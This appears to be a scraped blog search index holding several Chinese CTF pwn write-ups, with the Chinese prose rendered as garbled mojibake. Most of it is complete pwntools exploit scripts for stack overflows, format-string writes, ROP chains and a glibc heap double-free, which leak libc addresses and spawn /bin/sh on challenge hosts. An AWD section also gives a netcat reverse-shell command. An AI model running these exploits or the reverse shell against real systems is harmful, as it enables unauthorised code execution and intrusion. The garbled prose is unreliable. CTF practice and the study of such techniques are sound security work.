&lt;p&gt;ç¬¬ä¸€æ¬¡è¾“å…¥è¿œç«¯é™¤å»å«&lt;code&gt;flag&lt;/code&gt;å­—ä¸²çš„æ–‡ä»¶åä½¿å¾—&lt;code&gt;file_flag&lt;/code&gt;ä¸ºçœŸä»è€Œèƒ½è¿›å…¥read_fileå‡½æ•°&lt;br&gt;
è¿œç«¯&lt;code&gt;flag.txt&lt;/code&gt; 8å­—èŠ‚å¯ä»¥è®©&lt;code&gt;file_fd&lt;/code&gt;è¦†ç›–ä¸º0ï¼Œä½¿fd=0ï¼Œreadä»é”®ç›˜è¾“å…¥&lt;br&gt;
read_fileé‡Œé¢è¾“å…¥lengthæ—¶è°ƒç”¨&lt;code&gt;alloca()&lt;/code&gt;åœ¨æ ˆä¸Šåˆ†é…ç©ºé—´ï¼Œä½¿å¾—åç»­å¯ä»¥æ ˆæº¢å‡º&lt;br&gt;
æ­¤æ—¶file_nameä¸º&lt;code&gt;flag.txt&lt;/code&gt;ï¼Œé€šè¿‡load_fileå‡½æ•°åŠ ä¸Šåç§»ç›´æ¥è·³è½¬åˆ°&lt;br&gt;
&lt;code&gt;file_fd = open(file_name, 0, 0LL);&lt;/code&gt;ä»è€Œç»•è¿‡&lt;code&gt;flag&lt;/code&gt;å­—ä¸²åˆ¤æ–­&lt;br&gt;
ç¬¬ä¸€ä¸ª&lt;code&gt;ret&lt;/code&gt;ä½¿å¾—ç¨‹åºæ­£å¸¸è·³è½¬åˆ°æœ€read_fileï¼Œç¬¬äºŒä¸ª&lt;code&gt;ret&lt;/code&gt;å¹³è¡¡æ ˆ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28565)

load_text=0x401493
leak=0x4014ee
ret=0x40101a

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;file_name : &amp;quot;,b&amp;quot;.&amp;quot;)

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;file_name : &amp;quot;,b&amp;quot;flag.txt&amp;quot;)


io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;file_content_length : &amp;quot;,b&amp;quot;1&amp;quot;)
io.recvuntil(b&amp;quot;read more \n&amp;quot;)

gdb.attach(io)
pause()

payload=cyclic(0x18)+p64(load_text)+p64(ret)*2+p64(leak)
io.send(payload)

io.sendlineafter(b&amp;quot;file_content_length : &amp;quot;,b&amp;quot;1&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">NSSCTF Round#14 Basic. éƒ¨åˆ†wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/XKnqVgyRN1/"" data-c="
          &lt;h4 id=&#34;das-6æœˆèµ›fooooood&#34;&gt;DAS 6æœˆèµ›foooooodï¼š&lt;/h4&gt;
&lt;p&gt;éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯åªæœ‰3æ¬¡æœ‰æ•ˆè¾“å…¥æœºä¼šï¼Œæ‰¾è·³æ¿(&lt;code&gt;1-&amp;gt;2-&amp;gt;3-&amp;gt;value&lt;/code&gt;)å¯ä»¥ç”¨ä¸¤æ¬¡è¾“å…¥å†™æ‰æ ˆä¸Š&lt;code&gt;i&lt;/code&gt;çš„å€¼ä¸ºä¸€ä¸ªå¤§å€¼ä»è€Œå®ç°å¤šæ¬¡è¾“å…¥ï¼Œåé¢å°±æ˜¯éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ ‡å‡†æ‰“æ³•ï¼ŒåŠ«æŒretå¯ä»¥æ‰“ropä¹Ÿå¯ä»¥æ‰“one_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
# context(log_level=&#39;debug&#39;)

# io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25718)
io=process(&amp;quot;./pwn&amp;quot;)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def sd(cc):
    io.sendlineafter(b&amp;quot;what&#39;s your favourite food: &amp;quot;, cc)


io.recvuntil(b&amp;quot;Give me your name:&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;
io.sendline(payload)


io.recvuntil(b&amp;quot;what&#39;s your favourite food: &amp;quot;)
payload=&amp;quot;%11$p.%9$p&amp;quot;
io.sendline(payload)

gdb.attach(io)    
pause()

io.recvuntil(b&amp;quot;like &amp;quot;)
stack=int(io.recv(14),16)
stack0=stack-0xd0
ret_addr=stack0-0x10
rr=stack0+0xe0
# canary=int(io.recv(18),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
libc_addr=int(io.recv(14),16)-240-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
print(&amp;quot;stack: &amp;quot;+hex(stack))
print(&amp;quot;stack0: &amp;quot;+hex(stack0))
print(&amp;quot;libc_addr: &amp;quot;+hex(libc_addr))
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=one_gadget[3]+libc_addr
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+libc_addr

off0=(stack0-0x24)&amp;amp;0xffff
payload = &amp;quot;%{}c%{}$hn&amp;quot;.format(off0,11)
sd(payload)

sd(&#39;%100&#39;+&#39;c%37$hhn&#39;) #ä¿®æ”¹iå€¼ï¼Œå¢åŠ å¾ªç¯æ¬¡æ•°

# off1=(off0+0xc+0x8)
off1=ret_addr

def fmt_off(addr,value):

    payload = &amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,11)
    sd(payload)

    payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(value&amp;amp;0xff,37)
    sd(payload)

    for i in range(4):
        payload = &amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+1+i)&amp;amp;0xff,11)
        sd(payload)
        payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((value&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,37)
        sd(payload)
    
fmt_off(ret_addr,shell) #å•å­—èŠ‚å¾ªç¯å†™

for i in range(87):
    io.sendline(b&amp;quot;1&amp;quot;)


io.interactive()
    
# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;swpu_19_login&#34;&gt;SWPU_19_login&lt;/h4&gt;
&lt;p&gt;7/30å¤ä¹ ä¸€ä¸‹&lt;br&gt;
32ä½ï¼ŒåŠ«æŒmainå‡½æ•°è¿”å›åœ°å€ä¸ºone_gadget&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28348)
# io=process(&amp;quot;./login&amp;quot;)
elf=ELF(&amp;quot;./login&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

# gdb.attach(io)
# pause()

sh_addr=0x804b080
io.sendafter(b&amp;quot;name: \n&amp;quot;,b&amp;quot;/bin/sh\x00&amp;quot;)
io.recvuntil(b&amp;quot;word: \n&amp;quot;)

# 6 15

payload=b&amp;quot;%6$p.%15$p&amp;quot;
io.send(payload)
io.recvuntil(b&amp;quot;password: &amp;quot;)
stack_addr=int(io.recv(10),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(10),16)-241-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]
ret_addr=stack_addr+0x24
shell=leak_addr+0x3cbf7

print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))
print(&amp;quot;ret_addr: &amp;quot;+hex(ret_addr))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
print(&amp;quot;shell: &amp;quot;+hex(shell))

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hn&amp;quot;.format(ret_addr&amp;amp;0xffff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(shell&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ret_addr+1)&amp;amp;0xff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((shell&amp;gt;&amp;gt;8)&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ret_addr+2)&amp;amp;0xff,22)
io.send(payload)

io.recvuntil(b&amp;quot;again!\n&amp;quot;)
payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format((shell&amp;gt;&amp;gt;16)&amp;amp;0xff,59)
io.send(payload)


io.recvuntil(b&amp;quot;again!\n&amp;quot;)
io.send(b&amp;quot;wllmmllw&amp;quot;)

io.interactive()

# 0x3cbea execve(&amp;quot;/bin/sh&amp;quot;, esp+0x34, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x34] == NULL

# 0x3cbec execve(&amp;quot;/bin/sh&amp;quot;, esp+0x38, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x38] == NULL

# 0x3cbf0 execve(&amp;quot;/bin/sh&amp;quot;, esp+0x3c, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x3c] == NULL

# 0x3cbf7 execve(&amp;quot;/bin/sh&amp;quot;, esp+0x40, environ)
# constraints:
#   esi is the GOT address of libc
#   [esp+0x40] == NULL

# 0x6729f execl(&amp;quot;/bin/sh&amp;quot;, eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL

# 0x672a0 execl(&amp;quot;/bin/sh&amp;quot;, [esp])
# constraints:
#   esi is the GOT address of libc
#   [esp] == NULL

# 0x13573e execl(&amp;quot;/bin/sh&amp;quot;, eax)
# constraints:
#   ebx is the GOT address of libc
#   eax == NULL

# 0x13573f execl(&amp;quot;/bin/sh&amp;quot;, [esp])
# constraints:
#   ebx is the GOT address of libc
#   [esp] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;osu_miss_analyzer&#34;&gt;osu_miss_analyzer&lt;/h4&gt;
&lt;p&gt;oggæ‰“ä¸é€šæ€ä¹ˆåŠï¼Œæ ˆä¸Šå¸ƒç½®ropé“¾ï¼Œè¿™é“é¢˜å¡è¾“å…¥æŒºæ¶å¿ƒçš„&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&#39;./analyzer&#39;)
io=remote(&amp;quot;chal.osugaming.lol&amp;quot;,7273)
elf=ELF(&#39;./analyzer&#39;)
libc=elf.libc

# gdb.attach(io,&#39;b *0x4018d9\nc\n&#39;)
# pause()

def fi(s,n):
    payload =  b&amp;quot;\x00\xFB\xD6\x34\x01\x0B\x20\x32\x65\x61\x37\x32\x32\x31\x38\x65&amp;quot;
    payload += b&amp;quot;\x35\x36\x38\x30\x66\x33\x62\x63\x31\x65\x32\x39\x36\x66\x63\x64&amp;quot;
    payload += b&amp;quot;\x62\x37\x36\x33\x32\x39\x36\x0B&amp;quot;
    payload += &#39;{}{}&#39;.format(s,n).encode()
    payload += b&amp;quot;\x0B\x20\x66\x63\x36\x64\x63\x33\x64\x61\x62\x65\x30\x64\x63\x34&amp;quot;
    payload += b&amp;quot;\x65\x30\x35\x62\x33\x64\x65\x63\x32\x33\x39\x36\x64\x31\x30\x34&amp;quot;
    payload += b&amp;quot;\x32\x33\xDF\x02\x06\x00\x00\x00\xC0\x00\x05\x00\x00\x00\x32\x35&amp;quot;
    payload += b&amp;quot;\x3A\x01\x4C\x04\x01\x28\x00\x00\x00\x0b&amp;quot;
    return payload

payload=fi(&#39;\x05&#39;,&#39;%51$p&#39;)
io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())

io.recvuntil(b&amp;quot;name: &amp;quot;)
leak_addr=int(io.recv(14),16)-0x29d90
log.success(&amp;quot;leak_addr:&amp;quot;+hex(leak_addr))

shell=leak_addr+0xebc81
log.success(&amp;quot;shell:&amp;quot;+hex(shell))

pop_rdi=leak_addr+0x000000000002a3e5
ret=leak_addr+0x0000000000029139
leave_ret=leak_addr+0x000000000004da83
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

bss_addr=0x404400

def ab_write(content,addr):
    for i in range(6):
        tp=&#39;%{}c%16$hhn&#39;.format((content&amp;gt;&amp;gt;(8*i))&amp;amp;0xff).ljust(0x10,&#39;a&#39;)+p64(addr+i).decode(&#39;latin-1&#39;)
        slen=len(tp)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x18&#39;,tp)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())

# ab_write(shell,0x404070)
# ab_write(pop_rdi,bss_addr)
# ab_write(str_sh,bss_addr+8)
# ab_write(sys_addr,bss_addr+16)

## leak stack
payload=fi(&#39;\x04&#39;,&#39;%6$p&#39;)
io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
io.recvuntil(b&amp;quot;name: &amp;quot;)
stack_addr=int(io.recv(14),16)
log.success(&amp;quot;stack_addr:&amp;quot;+hex(stack_addr))
ret_addr=stack_addr-0x110


# gdb.attach(io,&#39;b *0x401686\nc&#39;)
# pause()

ab_write(pop_rdi,bss_addr)
ab_write(str_sh,bss_addr+0x8)
ab_write(sys_addr,bss_addr+0x10)

# gdb.attach(io,&#39;&#39;)
# pause()

def fmt_t(addr,ctt,off1,off2):
    tp=&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1).ljust(0x20,&#39;a&#39;)
    slen=len(tp)
    log.success(&amp;quot;slen:&amp;quot;+hex(slen))
    payload=fi(&#39;\x20&#39;,tp)
    io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
      
    for i in range(6):
        tp=&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i)&amp;amp;0xff,off1).ljust(0x20,&#39;a&#39;)
        slen=len(tp)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x20&#39;,tp)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
        
        tp1=&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i)*8))&amp;amp;0xff,off2).ljust(0x20,&#39;a&#39;)
        slen=len(tp1)
        log.success(&amp;quot;slen:&amp;quot;+hex(slen))
        payload=fi(&#39;\x20&#39;,tp1)
        io.sendlineafter(b&amp;quot;:\n&amp;quot;,payload.hex())
        

# def fmt_t(addr,ctt,off1,off2):
#     io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hn&amp;quot;.format(addr&amp;amp;0xffff,off1).hex())
#     io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format(ctt&amp;amp;0xff,off2).hex())
    
#     for i in range(5):
#         io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((addr+i+1)&amp;amp;0xff,off1))
#         io.sendafter(b&amp;quot;:\n&amp;quot;,&amp;quot;%{}c%{}$hhn&amp;quot;.format((ctt&amp;gt;&amp;gt;((i+1)*8))&amp;amp;0xff,off2))


fmt_t(ret_addr+0x8,pop_rdi,6,85)
fmt_t(ret_addr+0x10,str_sh,6,85)
fmt_t(ret_addr+0x18,sys_addr,6,85)
fmt_t(ret_addr,ret,6,85)

log.success(&amp;quot;stack_addr:&amp;quot;+hex(stack_addr))
log.success(&amp;quot;ret_addr:&amp;quot;+hex(ret_addr))
log.success(&amp;quot;str_sh:&amp;quot;+hex(str_sh))
log.success(&amp;quot;pop_rdi:&amp;quot;+hex(pop_rdi))

io.sendlineafter(b&amp;quot;:\n&amp;quot;,b&amp;quot;ls&amp;quot;)
io.sendline(b&amp;quot;cat flag.txt&amp;quot;)

io.interactive()


# 0xebc81 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL || r10 is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebc85 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [r10] == NULL || r10 == NULL || r10 is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xebc88 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   address rbp-0x78 is writable
#   [rsi] == NULL || rsi == NULL || rsi is a valid argv
#   [rdx] == NULL || rdx == NULL || rdx is a valid envp

# 0xebce2 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   r13 == NULL || {&amp;quot;/bin/sh&amp;quot;, r13, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xebd38 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   r12 == NULL || {&amp;quot;/bin/sh&amp;quot;, r12, NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebd3f execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x48 is writable
#   rax == NULL || {rax, r12, NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# 0xebd43 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;Pasted%20image%2020240304013446.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸² ä¾‹é¢˜</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/zoxorWZV-/"" data-c="
          &lt;p&gt;bugkuä¸Šæ‰“äº†ä¸¤åœºawdï¼Œç®€å•è®°å½•ä¸€ä¸‹&lt;br&gt;
winscpè¿ä¸Šæ–¹ä¾¿æ–‡ä»¶æ“ä½œï¼Œtabbyå†å¼€ä¸ªssh&lt;/p&gt;
&lt;p&gt;Aoiawdä¸Šæ¢é’ˆï¼Œå°†æœ¬æœºtmpæ–‡ä»¶å¤¹é‡Œé¢æ¢é’ˆæ‰”åˆ°é¶æœºä¸Šç„¶åæ‰§è¡ŒæŒ‡ä»¤&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chmod +x tapeworm.phar
chmod +x roundworm
chmod +x guardian.phar
./tapeworm.phar -d ç›®å½• -s ip:port
./roundworm  -w ç›®å½• -s ip -p port
./guardian.phar -i ç›®å½• -s ip:port
é€šå¸¸
./tapeworm.phar -d ../var/www/html -s ip:port
./roundworm  -w ../var/www/html -s ip -p port
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;dockeré‡Œé¢æ„å»ºçš„Aoiawdçš„guardianç”¨èµ·æ¥æœ‰ç‚¹é—®é¢˜ï¼Œä¸€èˆ¬æƒ…å†µevilPatcherèƒ½åº”ä»˜ä¸€ä¸‹&lt;br&gt;
æ­å»ºå¥½åå¯ä»¥çœ‹è®°å½•ï¼Œå¯ä»¥ç²—ç•¥åˆ¤æ–­å±é™©å¤„&lt;/p&gt;
&lt;p&gt;ä¸»æœºå¼€å¯ç«¯å£ç›‘å¬ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvvp 2333
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é¶æœºåå¼¹shellï¼Œå·²ç»æ‹¿é“è¿œç«¯shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc ä¸»æœºip 2333 -e /bin/bash
&lt;/code&gt;&lt;/pre&gt;
">AWDè®°å½•</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/MZwpgRHj1/"" data-c="
          &lt;h3 id=&#34;easy_stack&#34;&gt;easy_stack:&lt;/h3&gt;
&lt;p&gt;partial write+one_gadget&lt;br&gt;
é‡æ–°æ‰“åŒ…è¿‡çš„libcï¼Œæœ¬åœ°patchä¸äº†&lt;br&gt;
æœ¬åœ°ä¸patchè°ƒè¯•åå‘ç°&lt;code&gt;rsp+0x18&lt;/code&gt;ä¸ºmainå‡½æ•°åœ°å€&lt;br&gt;
å¯ä»¥ä¿®æ”¹mainå‡½æ•°è¿”å›åœ°å€ä½1å­—èŠ‚ä¸º&lt;code&gt;\x80&lt;/code&gt;&lt;br&gt;
ä½¿å…¶è·³è½¬åˆ°gadget&lt;br&gt;
&lt;code&gt;mov rax, qword ptr [rsp + 0x18]; call rax;&lt;/code&gt;&lt;br&gt;
å¯ä»¥å†æ¬¡è¿”å›mainï¼ŒåŒæ—¶å¯ä»¥æ³„éœ²libcåœ°å€&lt;br&gt;
æœ€åæ‰“one_gadgetå³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./easy_stack&amp;quot;)
io=remote(&amp;quot;nc.eonew.cn&amp;quot;,10004)
elf=ELF(&amp;quot;./easy_stack&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
# gdb.attach(io)
# pause()

payload=cyclic(0x88)+b&amp;quot;\x80&amp;quot;
io.sendline(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x21a80
print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

shell=leak_addr+0x415a6

payload=b&amp;quot;a&amp;quot;*0x88+p64(shell)
io.sendline(payload)

sleep(1)

io.interactive()
    
# 0x415a6 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x415fa execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xdfa51 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL
&lt;/code&gt;&lt;/pre&gt;
">xm_pwnè®°å½•</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/6yuwf6aET/"" data-c="
          &lt;p&gt;æœ€è¿‘ç¢°åˆ°å‡ é“æ•´å‹æº¢å‡ºçš„é¢˜ç›®&lt;br&gt;
æ­¤é¢˜2.34-3çš„glibcç‰ˆæœ¬ï¼Œå¸¸ç”¨hookå·²è¢«åˆ é™¤&lt;br&gt;
æ²¡æœ‰editå‡½æ•°ï¼Œä½†æ˜¯ç™½ç»™uaf&lt;br&gt;
æ­¤é¢˜å­˜åœ¨æ•´å‹æº¢å‡ºå¯ä»¥åˆ†é…å †å—åˆ°ä»»æ„åœ°å€ï¼Œçªç ´idxé™åˆ¶ï¼Œå¯ä»¥ä»»æ„åœ°å€æ³„éœ²&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1690368381255.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
é—æ†¾çš„æ˜¯æ­¤é¢˜åœ¨æœ¬æœºå¤ç°æ—¶showæ‰“å°main_arenaæŒ‡é’ˆæ³„éœ²libcå¤±è´¥ï¼Œå³ä½¿æ˜¯å…¶ä»–å¤§ä½¬wpçš„åç§»ä¹Ÿæ˜¯ï¼Œåªèƒ½æ‰“é€šè¿œç«¯&lt;br&gt;
2.34çš„ç¬¦å·è¡¨ä¹ŸæŒºéš¾æ‰¾çš„ï¼Œä¸€æ­¥ä¸€æ­¥ä¸‹å»æ‰¾çš„&lt;code&gt;exit_hook&lt;/code&gt;åç§»&lt;br&gt;
&lt;code&gt;exit_hook&lt;/code&gt;å³æŒ‡&lt;code&gt;_rtld_global._rtld_lock_recursive-&amp;gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;&lt;br&gt;
é‡Šæ”¾7ä¸ªåˆ°tcachebiné‡Œé¢ï¼Œåœ¨é‡Šæ”¾2ä¸ªå †å—åˆ°fastbin&lt;br&gt;
å¯ä»¥æ‰“double freeåŠ«æŒ&lt;code&gt;exit_hook&lt;/code&gt;ä¸ºone_gadget&lt;br&gt;
æœ€åè°ƒç”¨exitå‡½æ•°å³å¯getshell&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./newest_note&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28331)
elf=ELF(&amp;quot;./newest_note&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

io.sendlineafter(b&amp;quot;will be? :&amp;quot;,str(0x40040000))

def add(n,cc):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

gdb.attach(io)
pause()

show(539034)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x218cc0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0xeeccc
exit_hook=leak_addr+0x21a6c0


add(0,b&amp;quot;a&amp;quot;)
delete(0)
show(0)
io.recvuntil(b&amp;quot;Content: &amp;quot;)
key=u64(io.recv(5).ljust(8,b&amp;quot;\x00&amp;quot;))
heap_addr=key&amp;lt;&amp;lt;12
print(&amp;quot;heap_addr: &amp;quot;,hex(heap_addr))
print(&amp;quot;key: &amp;quot;+hex(key))

for i in range(9):
    add(i,b&amp;quot;a&amp;quot;)

add(9,b&amp;quot;a&amp;quot;)

for i in range(7):
    delete(i)
    
delete(7)
delete(8)
delete(7)

for i in range(7):
    add(i,b&amp;quot;a&amp;quot;)

add(7,p64(key^exit_hook))
add(8,b&amp;quot;a&amp;quot;)
add(7,b&amp;quot;a&amp;quot;)
add(10,p64(shell)*2)

io.sendlineafter(b&amp;quot;: &amp;quot;,b&amp;quot;4&amp;quot;)

io.interactive()


# 0xeeccc execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xeeccf execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xeecd2 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
